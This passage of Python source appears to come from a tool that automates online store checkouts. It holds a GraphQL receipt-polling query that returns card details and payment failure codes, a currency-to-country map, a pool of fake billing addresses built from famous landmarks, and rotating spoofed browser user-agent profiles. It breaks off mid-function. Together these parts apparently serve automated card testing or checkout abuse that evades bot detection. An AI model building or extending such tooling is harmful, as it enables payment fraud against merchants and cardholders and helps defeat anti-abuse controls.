CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# PASTE QUERY_POLL HERE
QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
    "AUD": "AU",
    "EUR": "DE",
    "JPY": "JP",
    "SGD": "SG",
    "CNY": "CN",
    "NZD": "NZ",
    "MXN": "MX",
    "SEK": "SE",
    "NOK": "NO",
    "DKK": "DK",
}

book = {
    "US": [
        {"address1": "350 Fifth Ave",         "city": "New York",     "postalCode": "10118", "zoneCode": "NY", "countryCode": "US", "phone": "2125550100"},
        {"address1": "233 S Wacker Dr",        "city": "Chicago",      "postalCode": "60606", "zoneCode": "IL", "countryCode": "US", "phone": "3125550147"},
        {"address1": "1 Apple Park Way",       "city": "Cupertino",    "postalCode": "95014", "zoneCode": "CA", "countryCode": "US", "phone": "4085550100"},
        {"address1": "888 Brickell Ave",       "city": "Miami",        "postalCode": "33131", "zoneCode": "FL", "countryCode": "US", "phone": "3055550189"},
        {"address1": "100 Main St",            "city": "Houston",      "postalCode": "77002", "zoneCode": "TX", "countryCode": "US", "phone": "7135550142"},
        {"address1": "3180 W Sahara Ave",      "city": "Las Vegas",    "postalCode": "89102", "zoneCode": "NV", "countryCode": "US", "phone": "7025550198"},
        {"address1": "700 N Brand Blvd",       "city": "Glendale",     "postalCode": "91203", "zoneCode": "CA", "countryCode": "US", "phone": "8185550173"},
        {"address1": "1600 Pennsylvania Ave",  "city": "Washington",   "postalCode": "20500", "zoneCode": "DC", "countryCode": "US", "phone": "2025550100"},
    ],
    "CA": [
        {"address1": "88 Queen St W",          "city": "Toronto",      "postalCode": "M5H 2M4", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
        {"address1": "1055 W Georgia St",      "city": "Vancouver",    "postalCode": "V6E 3P3", "zoneCode": "BC", "countryCode": "CA", "phone": "6045550100"},
        {"address1": "1000 De La Commune",     "city": "Montreal",     "postalCode": "H2L 1X3", "zoneCode": "QC", "countryCode": "CA", "phone": "5145550145"},
        {"address1": "10123 99 St NW",         "city": "Edmonton",     "postalCode": "T5J 3H1", "zoneCode": "AB", "countryCode": "CA", "phone": "7805550110"},
    ],
    "GB": [
        {"address1": "221B Baker St",          "city": "London",       "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
        {"address1": "1 Piccadilly",           "city": "London",       "postalCode": "W1J 0DA", "zoneCode": "ENG", "countryCode": "GB", "phone": "2074990234"},
        {"address1": "30 St Mary Axe",         "city": "London",       "postalCode": "EC3A 8BF","zoneCode": "ENG", "countryCode": "GB", "phone": "2070717234"},
        {"address1": "12 George St",           "city": "Edinburgh",    "postalCode": "EH2 2PF", "zoneCode": "SCT", "countryCode": "GB", "phone": "1315550102"},
        {"address1": "5 Park Place",           "city": "Cardiff",      "postalCode": "CF10 3DP","zoneCode": "WLS", "countryCode": "GB", "phone": "2920550191"},
    ],
    "AU": [
        {"address1": "1 Martin Place",         "city": "Sydney",       "postalCode": "2000",  "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
        {"address1": "120 Collins St",         "city": "Melbourne",    "postalCode": "3000",  "zoneCode": "VIC", "countryCode": "AU", "phone": "396541234"},
        {"address1": "45 Eagle St",            "city": "Brisbane",     "postalCode": "4000",  "zoneCode": "QLD", "countryCode": "AU", "phone": "732210000"},
        {"address1": "250 St Georges Tce",     "city": "Perth",        "postalCode": "6000",  "zoneCode": "WA",  "countryCode": "AU", "phone": "893211234"},
    ],
    "IN": [
        {"address1": "221B MG Road",           "city": "Mumbai",       "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "2222625757"},
        {"address1": "15 Brigade Road",        "city": "Bangalore",    "postalCode": "560001", "zoneCode": "KA", "countryCode": "IN", "phone": "8022221000"},
        {"address1": "10 Connaught Place",     "city": "New Delhi",    "postalCode": "110001", "zoneCode": "DL", "countryCode": "IN", "phone": "1123341234"},
        {"address1": "32 Anna Salai",          "city": "Chennai",      "postalCode": "600002", "zoneCode": "TN", "countryCode": "IN", "phone": "4428415678"},
        {"address1": "1 Park St",              "city": "Kolkata",      "postalCode": "700016", "zoneCode": "WB", "countryCode": "IN", "phone": "3322001234"},
    ],
    "AE": [
        {"address1": "Burj Khalifa Tower",     "city": "Dubai",        "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "97143231234"},
        {"address1": "Al Maryah Island",       "city": "Abu Dhabi",    "postalCode": "00000", "zoneCode": "AZ", "countryCode": "AE", "phone": "97126969696"},
        {"address1": "Hamdan St 55",           "city": "Dubai",        "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "97143551234"},
    ],
    "HK": [
        {"address1": "88 Queensway",           "city": "Admiralty",    "postalCode": "999077", "zoneCode": "HK", "countryCode": "HK", "phone": "85228689111"},
        {"address1": "Nathan Road 100",        "city": "Kowloon",      "postalCode": "999077", "zoneCode": "KL", "countryCode": "HK", "phone": "85227216688"},
    ],
    "CN": [
        {"address1": "8 Zhongguancun St",      "city": "Beijing",      "postalCode": "100080", "zoneCode": "11", "countryCode": "CN", "phone": "1062512345"},
        {"address1": "100 Century Ave",        "city": "Shanghai",     "postalCode": "200120", "zoneCode": "31", "countryCode": "CN", "phone": "2150504000"},
    ],
    "CH": [
        {"address1": "Gotthardstrasse 17",     "city": "Zurich",       "postalCode": "8002",  "zoneCode": "ZH", "countryCode": "CH", "phone": "442012000"},
        {"address1": "Rue du Rhone 48",        "city": "Geneva",       "postalCode": "1204",  "zoneCode": "GE", "countryCode": "CH", "phone": "227083300"},
    ],
    "DE": [
        {"address1": "Unter den Linden 77",    "city": "Berlin",       "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "3020450"},
        {"address1": "Maximilianstr 5",        "city": "Munich",       "postalCode": "80539", "zoneCode": "BY", "countryCode": "DE", "phone": "8921230"},
        {"address1": "Kaiserstr 10",           "city": "Frankfurt",    "postalCode": "60311", "zoneCode": "HE", "countryCode": "DE", "phone": "6921230"},
    ],
    "FR": [
        {"address1": "1 Ave des Champs-Elysees","city": "Paris",       "postalCode": "75008", "zoneCode": "IDF","countryCode": "FR", "phone": "140695000"},
        {"address1": "20 Rue de la Paix",      "city": "Paris",        "postalCode": "75002", "zoneCode": "IDF","countryCode": "FR", "phone": "142333333"},
        {"address1": "3 Quai Sarrail",         "city": "Lyon",         "postalCode": "69006", "zoneCode": "ARA","countryCode": "FR", "phone": "472406040"},
    ],
    "NL": [
        {"address1": "Dam 1",                  "city": "Amsterdam",    "postalCode": "1012 JS","zoneCode": "NH", "countryCode": "NL", "phone": "2055000200"},
        {"address1": "Binnenhof 1A",           "city": "The Hague",    "postalCode": "2513 AA","zoneCode": "ZH", "countryCode": "NL", "phone": "703564434"},
    ],
    "SG": [
        {"address1": "1 Raffles Place",        "city": "Singapore",    "postalCode": "048616", "zoneCode": "SG", "countryCode": "SG", "phone": "65350001"},
        {"address1": "8 Marina View",          "city": "Singapore",    "postalCode": "018960", "zoneCode": "SG", "countryCode": "SG", "phone": "65350002"},
    ],
    "JP": [
        {"address1": "2-1 Marunouchi",         "city": "Tokyo",        "postalCode": "100-0005","zoneCode": "13","countryCode": "JP", "phone": "332138888"},
        {"address1": "1-chome Namba",          "city": "Osaka",        "postalCode": "542-0076","zoneCode": "27","countryCode": "JP", "phone": "662414101"},
    ],
    "MX": [
        {"address1": "Paseo de la Reforma 505","city": "Mexico City",  "postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5555550100"},
        {"address1": "Av Constitucion 1065",   "city": "Monterrey",    "postalCode": "64000", "zoneCode": "NLE","countryCode": "MX", "phone": "8183330100"},
    ],
    "SE": [
        {"address1": "Drottninggatan 53",      "city": "Stockholm",    "postalCode": "111 21", "zoneCode": "AB", "countryCode": "SE", "phone": "86790000"},
    ],
    "NO": [
        {"address1": "Karl Johans Gate 22",    "city": "Oslo",         "postalCode": "0026",  "zoneCode": "03", "countryCode": "NO", "phone": "22341000"},
    ],
    "DK": [
        {"address1": "Stroget 5",              "city": "Copenhagen",   "postalCode": "1001",  "zoneCode": "84", "countryCode": "DK", "phone": "33150000"},
    ],
    "NZ": [
        {"address1": "1 Queen St",             "city": "Auckland",     "postalCode": "1010",  "zoneCode": "AUK", "countryCode": "NZ", "phone": "93090000"},
        {"address1": "148 Lambton Quay",       "city": "Wellington",   "postalCode": "6011",  "zoneCode": "WGN", "countryCode": "NZ", "phone": "44990000"},
        {"address1": "75 Cashel St",           "city": "Christchurch", "postalCode": "8011",  "zoneCode": "CAN", "countryCode": "NZ", "phone": "33660000"},
        {"address1": "50 Princes St",          "city": "Dunedin",      "postalCode": "9016",  "zoneCode": "OTA", "countryCode": "NZ", "phone": "34774000"},
    ],
    "DEFAULT": [
        {"address1": "350 Fifth Ave",          "city": "New York",     "postalCode": "10118", "zoneCode": "NY", "countryCode": "US", "phone": "2125550100"},
        {"address1": "233 S Wacker Dr",        "city": "Chicago",      "postalCode": "60606", "zoneCode": "IL", "countryCode": "US", "phone": "3125550147"},
        {"address1": "1 Apple Park Way",       "city": "Cupertino",    "postalCode": "95014", "zoneCode": "CA", "countryCode": "US", "phone": "4085550100"},
        {"address1": "888 Brickell Ave",       "city": "Miami",        "postalCode": "33131", "zoneCode": "FL", "countryCode": "US", "phone": "3055550189"},
    ],
}

# ── Browser User-Agent pool: Mac · iOS · Windows ─────────────────────────────
# Each tuple: (user_agent, sec_ch_ua, sec_ch_ua_mobile, sec_ch_ua_platform)
# sec-ch-ua fields are None for Safari / iOS (no Client Hints support).
_UA_PROFILES = [
    # macOS – Chrome 124
    (
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        '?0', '"macOS"',
    ),
    # macOS – Chrome 146
    (
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        '"Chromium";v="146", "Google Chrome";v="146", "Not-A.Brand";v="24"',
        '?0', '"macOS"',
    ),
    # macOS – Edge 146
    (
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
        '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        '?0', '"macOS"',
    ),
    # macOS – Safari 17.5
    (
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
        None, None, None,
    ),
    # macOS – Safari 17.4.1
    (
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
        None, None, None,
    ),
    # macOS – Safari 16.6
    (
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
        None, None, None,
    ),
    # iOS 17.5 – Safari (iPhone)
    (
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        None, None, None,
    ),
    # iOS 17.4.1 – Safari (iPhone)
    (
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
        None, None, None,
    ),
    # iOS 16.7 – Safari (iPhone)
    (
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Mobile/15E148 Safari/604.1',
        None, None, None,
    ),
    # iOS 17.4 – Chrome (iPhone)
    (
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.88 Mobile/15E148 Safari/604.1',
        None, None, None,
    ),
    # iPadOS 17 – Safari
    (
        'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        None, None, None,
    ),
    # Windows – Chrome 146
    (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        '"Chromium";v="146", "Google Chrome";v="146", "Not-A.Brand";v="24"',
        '?0', '"Windows"',
    ),
    # Windows – Edge 146
    (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
        '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        '?0', '"Windows"',
    ),
    # Windows – Chrome 124
    (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        '?0', '"Windows"',
    ),
]


def pick_ua_profile():
    """Return a random (user_agent, sec_ch_ua, sec_ch_ua_mobile, sec_ch_ua_platform)."""
    return random.choice(_UA_PROFILES)


def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
